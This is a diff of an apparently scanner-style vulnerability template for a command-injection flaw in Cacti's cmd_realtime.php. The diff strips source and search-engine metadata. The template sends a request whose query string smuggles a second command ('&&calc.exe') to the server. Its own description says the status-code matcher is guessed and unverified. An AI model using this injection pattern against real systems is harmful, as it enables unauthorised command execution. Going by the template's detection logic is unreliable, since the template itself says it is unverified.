@@ -3,21 +3,13 @@ info:
   name: Cacti网络流量监测图形分析工具 任意命令执行漏洞_gg54as3fbtgkoep7
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="Cacti-Monitoring"
 http:
 - raw:
   - 'GET /cacti/cmd_realtime.php?1+1&&calc.exe+1+1+1 HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1716207679276-760d0b38-982a-4514-897a-ac5f1667939d.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
